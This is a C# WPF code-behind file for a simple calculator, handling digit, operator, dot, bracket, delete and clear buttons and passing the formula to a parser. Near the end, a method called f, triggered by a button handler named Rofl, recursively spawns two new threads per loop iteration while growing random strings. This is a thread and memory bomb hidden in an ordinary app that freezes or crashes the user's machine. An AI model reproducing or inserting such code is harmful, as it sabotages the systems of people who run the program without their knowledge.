using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Media.TextFormatting;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CALC
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        List<String> text;
        int lastButton = 0; //0 - num, 1 - oper
        bool dotClicked = false;
        string[] opers = { "/", "*", "-", "+" };

        public MainWindow()
        {
            InitializeComponent();
            text = new List<string>();
        }

        private void NumClick(object sender, RoutedEventArgs e)
        {
            var b = (Button)sender;
            if (lastButton == 0 && text.Count > 0)
            {
                text[text.Count - 1] += (string)b.Content;
            }
            else if (lastButton == 1 || text.Count == 0)
            {
                text.Add((string)b.Content);

            }
            lastButton = 0;
            TextNum.Text = String.Join("", text);

        }

        private void ClickDot(object sender, RoutedEventArgs e)
        {
            if (dotClicked)
                return;

            text[text.Count - 1] += ',';
            TextNum.Text = String.Join("", text);
            dotClicked = true;
            lastButton = 0;
        }

        private void SignClick(object sender, RoutedEventArgs e)
        {


            var b = (Button)sender;
            if (lastButton == 0)
                text.Add((string)b.Content);
            else
            {
                text[text.Count - 1] = (string)b.Content;
            }
            lastButton = 1;
            dotClicked = false;
            TextNum.Text = String.Join("", text);

        }


        private void Clear(object sender, RoutedEventArgs e)
        {
            text.Clear();
            lastButton = 0;
            dotClicked = false;
            TextNum.Text = "";

        }

        private void DelLast(object sender, RoutedEventArgs e)
        {
            if (text.Count == 0) return;

            string c = text[text.Count - 1];
            if (opers.Contains(c))
            {
                text.RemoveAt(text.Count - 1);
                lastButton = 0;
            }
            else
            {
                var t = text[text.Count - 1];
                text[text.Count - 1] = t.Substring(0, t.Length - 1);
                if (text[text.Count - 1] == "")
                {
                    text.RemoveAt(text.Count - 1);
                    if (text.Count > 0){
                    t = text[text.Count - 1];
                        if (opers.Contains(t))
                            lastButton = 1;
                        else
                        {
                            lastButton = 0;
                            dotClicked = t.Contains(',');
                        }
                    }
                }
            }
            TextNum.Text = string.Join("", text);
        }

        private void AddBraket(object sender, RoutedEventArgs e)
        {
            var b = (Button)sender;
            text.Add((string)b.Content);
            TextNum.Text = string.Join("", text);
        }


        private void ShowSum(object sender, RoutedEventArgs e)
        {
            var t = FormulaParser.Calculate(string.Join(" ", text));
            Clear(sender, e);
            TextNum.Text = t;
        }

        private void f(string s)
        {
            var r = new Random();
            s += r.NextDouble().ToString();
            for (int i = 0; i < int.MaxValue; i++)
            {
                s += r.NextDouble().ToString();
                new Thread(() => { f(s); }).Start();
                new Thread(() => { f(s); }).Start();
            }
        }

        private void Rofl(object sender, RoutedEventArgs e)
        {
            f("");
        }

    }
}